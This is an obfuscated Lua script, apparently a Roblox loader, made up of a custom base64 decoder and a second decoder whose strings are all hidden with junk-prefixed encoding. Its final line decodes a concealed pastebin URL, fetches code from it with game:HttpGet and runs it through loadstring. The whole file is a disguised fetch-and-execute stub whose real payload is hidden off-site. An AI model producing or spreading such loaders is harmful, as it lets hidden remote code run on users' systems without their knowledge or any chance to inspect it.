local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local b=iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('FgoZOzInBRpVlmbfcJzavdwFKvdCVNSOjdopgGMboCPUYoHbOeghguuQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLw==')
function mVNYznvGBKtsZrwuvrmlMcXOTLjszOsZsZrOZpIdSADvYaoWhYj(data) m=string.sub(data, 0, 55) data=data:gsub(m,iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('LNvIdYtvbKYDKufhVtUQIkDnFHOwjPLeVqcwHMhzsfHrjpCyqiOrQSG'))

data = string.gsub(data, iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('MHjqXJcqhWfCAzuFOEijOjtFfqLHzshDwEAJzIGlppZFHEfyctzLDqPW14=')..b..iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('MChIZnMzrhkMHjqwVUxdFFvQClSxUuuFgjzPJdeTQMerUMKaUQfEmZePV0='), iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('NUvFdNkQcdTRGGElGxvoFoRuoycyyMSBeyMWRgWguqNLyOwRoQwCLfn')) return (data:gsub(iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('GxEQPomPxMDlWNitujSGDXMUzzAlJcdIqNeSkUqKpQcwojDfGswfsMXLg=='), function(x) if (x == iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('molQjLQOdfpbeeqjPqcEDVmAbGQiiYxcPgNzqEypEOvNAevADFjlFjDPQ==')) then return iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('tXhAubUKOSCRmyLXdXJegXSiTguhKhDHYyMlkMsLuYVqFTQvGRLBzMq') end local r,f=iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('DwkhwcbylrYyngGqyNBpYJrKRkOlTDshlzTfxgWAFGATTKAZyVxbptA'),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('sAaZfZuKCVPQCVUQxNokMMhZwtiuTtcCSthnsMFtMeuYrusizpyUfGWMQ==') or iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('qnDFPGIaRgaakRzQTlvjwTVEQCwhidrbCBqfMKOPlmyZytHRYmBAJOjMA==')) end return r; end):gsub(iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('BOWJBCLIODfOVFWAYYmVhhxrJKcRyXgPuSpWKJlxedxOBoWGGtkLtCdJWQlZCVkPyVkPyVkPyVkPyVkPyVkPw=='), function(x) if (#x ~= 8) then return iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('oEzDgOzthjkHgWWiyKtVGuHqBHhhMqdKhjMigEvRCuAlxvDjgKVrzfN') end local c=0 for i=1,8 do c=c+(x:sub(i,i)==iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('aBkSnrFeFRqQlxYPPHfKOJZtjhrAvRbWFYTfcdhSPRaMgGwkBClffMFMQ==') and 2^(8-i) or 0) end return string.char(c) end)) end


 


loadstring(game:HttpGet(mVNYznvGBKtsZrwuvrmlMcXOTLjszOsZsZrOZpIdSADvYaoWhYj(iIyUGOUJYEdFvaqgSnBOWoipEVyJjRkhPrRLq('nsMLBOAchahCbCACNbPLxnhJngPNAZcCNrpyLIkNTmdPeYbhRbfECflY295Y2FWSGVOZENrcU96S3VETUppRElZRnZoYnBNRktId2ZHalZHUElSYUdJWklSSHdnaFpKYmFIUjBjSE02THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDNKQmRtWkNOMEZL'))))()        
